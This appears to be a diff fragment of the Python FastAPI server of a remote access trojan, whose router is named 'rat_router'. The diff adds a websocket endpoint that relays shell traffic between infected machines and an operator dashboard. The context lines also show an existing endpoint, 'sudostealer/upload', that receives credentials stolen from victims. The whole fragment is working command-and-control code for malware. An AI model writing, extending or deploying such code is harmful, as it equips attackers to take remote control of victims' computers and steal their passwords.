@@ -47,6 +47,24 @@ async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine
 	finally:
 		await machines.all[machine_id].on_disconnect(websocket.client.host)
 
+@rat_router.websocket("/api/{version}/tunnel/{tunnel_id}")
+async def shell_websocket_endpoint(websocket: WebSocket, version: int, tunnel_id: Uid):
+	await websocket.accept()
+	try:
+		if tunnel_id not in con.tunnels:
+			return
+		con.tunnels[tunnel_id].machine_socket = websocket
+		while True:
+			data = await websocket.receive_text()
+			if con.tunnels[tunnel_id].dashboard_socket:
+				await con.tunnels[tunnel_id].dashboard_socket.send_text(data)
+	except WebSocketDisconnect:
+		pass
+	finally:
+		if tunnel_id in con.tunnels:
+			await con.tunnels[tunnel_id].close()
+			del con.tunnels[tunnel_id]
+
 @rat_router.post("/api/{version}/{machine_id}/sudostealer/upload")
 async def upload_credentials(version: int, machine_id: Uid, request: Request) -> None:
 	text = (await request.body()).decode()
